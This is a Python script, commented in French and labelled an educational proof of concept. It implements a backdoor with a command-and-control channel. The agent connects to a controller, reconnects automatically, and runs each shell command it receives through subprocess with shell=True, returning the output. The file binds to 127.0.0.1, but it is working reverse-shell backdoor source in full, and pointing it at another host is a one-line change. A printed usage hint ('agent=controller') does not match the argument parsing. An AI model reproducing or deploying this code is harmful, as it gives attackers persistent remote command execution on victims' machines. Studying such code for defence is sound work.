#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Dossier: Ware - Étape 06: Backdoor C2 (PoC Éducatif)
Intention: Al-Basir (Voir pour comprendre comment l'adversaire maintient
           une emprise distante)
Description: Simule une backdoor avec canal de commande C2 (Command &
             Control). Le client envoie un heartbeat périodique au
             contrôleur et reçoit des commandes shell en retour.
             PoC local uniquement : contrôleur et agent sur 127.0.0.1.
Conformité: Flake8 / 88 caractères maximum.
"""

import socket
import subprocess
import time
import threading

C2_HOST = "127.0.0.1"
C2_PORT = 4444
HEARTBEAT_INTERVAL = 5  # secondes
RECONNECT_DELAY = 3


def run_command(cmd):
    """Exécute une commande shell et retourne la sortie."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=10
        )
        return result.stdout + result.stderr or "[commande sans sortie]"
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[erreur] {e}"


def c2_agent():
    """
    Agent backdoor : se connecte au contrôleur C2, envoie un heartbeat,
    attend des commandes et les exécute.
    Simule la persistance de connexion avec reconnexion automatique.
    """
    print(f"[C2-Agent] Connexion vers {C2_HOST}:{C2_PORT}...")
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((C2_HOST, C2_PORT))
            print("[C2-Agent] Connecté au contrôleur.")

            # Heartbeat initial
            sock.sendall(b"[HEARTBEAT] Agent actif\n")

            while True:
                data = sock.recv(1024).decode("utf-8", errors="ignore").strip()
                if not data:
                    break
                if data == "exit":
                    print("[C2-Agent] Fermeture sur ordre du contrôleur.")
                    sock.close()
                    return
                print(f"[C2-Agent] Commande reçue : {data}")
                output = run_command(data)
                sock.sendall(output.encode("utf-8", errors="replace") + b"\n")

        except (ConnectionRefusedError, OSError):
            print(
                f"[C2-Agent] Contrôleur inaccessible."
                f" Reconnexion dans {RECONNECT_DELAY}s..."
            )
            time.sleep(RECONNECT_DELAY)


def c2_controller():
    """
    Contrôleur C2 (simulé localement) : écoute, accepte la connexion
    de l'agent et permet l'envoi de commandes interactives.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((C2_HOST, C2_PORT))
    server.listen(1)
    print(f"[C2-Contrôleur] En écoute sur {C2_HOST}:{C2_PORT}...")

    conn, addr = server.accept()
    print(f"[C2-Contrôleur] Agent connecté depuis {addr}")

    try:
        while True:
            data = conn.recv(4096).decode("utf-8", errors="ignore")
            if data:
                print(f"[Agent] {data.strip()}")
            cmd = input("[C2> ] ").strip()
            if not cmd:
                continue
            conn.sendall(cmd.encode("utf-8") + b"\n")
            if cmd == "exit":
                break
            time.sleep(0.5)
            resp = conn.recv(65536).decode("utf-8", errors="ignore")
            print(f"[Réponse]\n{resp}")
    finally:
        conn.close()
        server.close()


if __name__ == "__main__":
    import sys
    mode = sys.argv[1] if len(sys.argv) > 1 else "agent"
    if mode == "controller":
        c2_controller()
    else:
        # Lance l'agent dans un thread pour démonstration
        t = threading.Thread(target=c2_agent, daemon=True)
        t.start()
        print("[PoC] Agent C2 démarré. Lancez le contrôleur avec : agent=controller")
        try:
            while True:
                time.sleep(HEARTBEAT_INTERVAL)
        except KeyboardInterrupt:
            print("\n[C2-Agent] Arrêt.")
